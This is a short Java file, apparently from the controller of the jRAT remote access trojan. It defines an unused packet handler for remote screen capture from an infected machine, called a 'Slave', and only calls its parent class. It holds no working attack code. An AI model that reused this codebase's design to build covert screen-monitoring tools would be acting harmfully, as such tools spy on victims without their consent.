package su.jrat.client.packets.incoming;

import java.io.DataInputStream;

import su.jrat.client.Slave;


public class Packet18OneRemoteScreen extends Packet17RemoteScreen {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		/* Unused */
		super.read(slave, dis);
	}

}
